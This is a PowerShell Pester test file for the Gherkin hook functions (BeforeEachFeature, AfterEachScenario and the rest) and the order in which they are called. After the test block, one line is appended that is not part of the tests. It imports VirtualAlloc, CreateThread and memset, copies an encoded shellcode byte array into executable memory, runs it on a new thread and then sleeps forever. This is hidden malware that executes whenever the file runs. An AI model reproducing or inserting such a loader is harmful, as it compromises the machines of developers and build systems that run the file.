﻿Set-StrictMode -Version Latest

$scriptRoot = Split-Path (Split-Path $MyInvocation.MyCommand.Path)

Describe 'Testing Gherkin Hook' -Tag Gherkin {

    BeforeEach {
        & ( Get-Module Pester ) {
            $script:GherkinHooks = @{
                BeforeEachFeature  = @()
                BeforeEachScenario = @()
                AfterEachFeature   = @()
                AfterEachScenario  = @()
            }
        }
    }

    It "Has a BeforeEachFeature function which takes a ScriptBlock and populates GherkinHooks" {
        BeforeEachFeature { }

        & ( Get-Module Pester ) {
            $GherkinHooks["BeforeEachFeature"].Count
        } |  Should -Be 1
    }

    It "Has a BeforeEachScenario function which takes a ScriptBlock and populates GherkinHooks" {
        BeforeEachScenario { }

        & ( Get-Module Pester ) {
            $GherkinHooks["BeforeEachScenario"].Count
        } |  Should -Be 1
    }

    It "Has a AfterEachFeature function which takes a ScriptBlock and populates GherkinHooks" {
        AfterEachFeature { }

        & ( Get-Module Pester ) {
            $GherkinHooks["AfterEachFeature"].Count
        } |  Should -Be 1
    }

    It "Has a AfterEachFeature function which takes a ScriptBlock and populates GherkinHooks" {
        AfterEachFeature { }

        & ( Get-Module Pester ) {
            $GherkinHooks["AfterEachFeature"].Count
        } |  Should -Be 1
    }

    It "The BeforeEachFeature function takes Tags and stores them" {
        BeforeEachFeature "WIP" { Write-Warning "This Test marked ''In Progress''" }

        & ( Get-Module Pester ) {
            $GherkinHooks["BeforeEachFeature"][-1].Tags
        } |  Should -Be "WIP"
    }

    It "The BeforeEachScenario function takes Tags and stores them" {
        BeforeEachScenario "WIP" { Write-Warning "This Test marked ''In Progress''" }

        & ( Get-Module Pester ) {
            $GherkinHooks["BeforeEachScenario"][-1].Tags
        } |  Should -Be "WIP"
    }

    It "The AfterEachFeature function takes Tags and stores them" {
        AfterEachFeature "WIP" { Write-Warning "This Test marked ''In Progress''" }

        & ( Get-Module Pester ) {
            $GherkinHooks["AfterEachFeature"][-1].Tags
        } |  Should -Be "WIP"
    }

    It "The AfterEachFeature function takes Tags and stores them" {
        AfterEachFeature "WIP" { Write-Warning "This Test marked ''In Progress''" }

        & ( Get-Module Pester ) {
            $GherkinHooks["AfterEachFeature"][-1].Tags
        } |  Should -Be "WIP"
    }

    It "Calls the hooks in order" {
        $Warnings = Start-Job -ArgumentList $scriptRoot -ScriptBlock {
            param ($scriptRoot)
            Get-Module Pester | Remove-Module -Force
            Import-Module $scriptRoot\Pester.psd1 -Force

            $Global:GherkinOrderTests = Join-Path $scriptRoot Examples\Validator\OrderTrace.txt
            if (Test-Path $Global:GherkinOrderTests) {
                Remove-Item $Global:GherkinOrderTests
            }
            Invoke-Gherkin (Join-Path $scriptRoot Examples\Validator\Validator.feature) -Show None
            Get-Content $Global:GherkinOrderTests
            Remove-item $Global:GherkinOrderTests
        } | Wait-Job | Receive-Job

        $ExpectedOutput = "
            BeforeEachFeature
            BeforeEachScenario
            Scenario One
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            BeforeEachScenario
            Scenario Two
            AfterEachScenario
            AfterEachFeature
        " -split "\r?\n" | ForEach-Object { $_.Trim() } | Where-Object { $_ }

        
        $Warnings | Should -Be $ExpectedOutput

    }

}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcb,0xd9,0x74,0x24,0xf4,0xba,0xcb,0x35,0xe5,0x7f,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x53,0x18,0x03,0x53,0x18,0x83,0xeb,0x37,0xd7,0x10,0x83,0x2f,0x9a,0xdb,0x7c,0xaf,0xfb,0x52,0x99,0x9e,0x3b,0x00,0xe9,0xb0,0x8b,0x42,0xbf,0x3c,0x67,0x06,0x54,0xb7,0x05,0x8f,0x5b,0x70,0xa3,0xe9,0x52,0x81,0x98,0xca,0xf5,0x01,0xe3,0x1e,0xd6,0x38,0x2c,0x53,0x17,0x7d,0x51,0x9e,0x45,0xd6,0x1d,0x0d,0x7a,0x53,0x6b,0x8e,0xf1,0x2f,0x7d,0x96,0xe6,0xe7,0x7c,0xb7,0xb8,0x7c,0x27,0x17,0x3a,0x51,0x53,0x1e,0x24,0xb6,0x5e,0xe8,0xdf,0x0c,0x14,0xeb,0x09,0x5d,0xd5,0x40,0x74,0x52,0x24,0x98,0xb0,0x54,0xd7,0xef,0xc8,0xa7,0x6a,0xe8,0x0e,0xda,0xb0,0x7d,0x95,0x7c,0x32,0x25,0x71,0x7d,0x97,0xb0,0xf2,0x71,0x5c,0xb6,0x5d,0x95,0x63,0x1b,0xd6,0xa1,0xe8,0x9a,0x39,0x20,0xaa,0xb8,0x9d,0x69,0x68,0xa0,0x84,0xd7,0xdf,0xdd,0xd7,0xb8,0x80,0x7b,0x93,0x54,0xd4,0xf1,0xfe,0x30,0x19,0x38,0x01,0xc0,0x35,0x4b,0x72,0xf2,0x9a,0xe7,0x1c,0xbe,0x53,0x2e,0xda,0xc1,0x49,0x96,0x74,0x3c,0x72,0xe7,0x5d,0xfa,0x26,0xb7,0xf5,0x2b,0x47,0x5c,0x06,0xd4,0x92,0xc9,0x03,0x42,0x90,0xf1,0x96,0x26,0xc2,0x0f,0xa7,0x47,0xa8,0x99,0x41,0x17,0x9e,0xc9,0xdd,0xd7,0x4e,0xaa,0x8d,0xbf,0x84,0x25,0xf1,0xdf,0xa6,0xef,0x9a,0x75,0x49,0x46,0xf2,0xe1,0xf0,0xc3,0x88,0x90,0xfd,0xd9,0xf4,0x92,0x76,0xee,0x09,0x5c,0x7f,0x9b,0x19,0x08,0x8f,0xd6,0x40,0x9e,0x90,0xcc,0xef,0x1e,0x05,0xeb,0xb9,0x49,0xb1,0xf1,0x9c,0xbd,0x1e,0x09,0xcb,0xb6,0x97,0x9f,0xb4,0xa0,0xd7,0x4f,0x35,0x30,0x8e,0x05,0x35,0x58,0x76,0x7e,0x66,0x7d,0x79,0xab,0x1a,0x2e,0xec,0x54,0x4b,0x83,0xa7,0x3c,0x71,0xfa,0x80,0xe2,0x8a,0x29,0x11,0xde,0x5c,0x17,0x67,0x0e,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

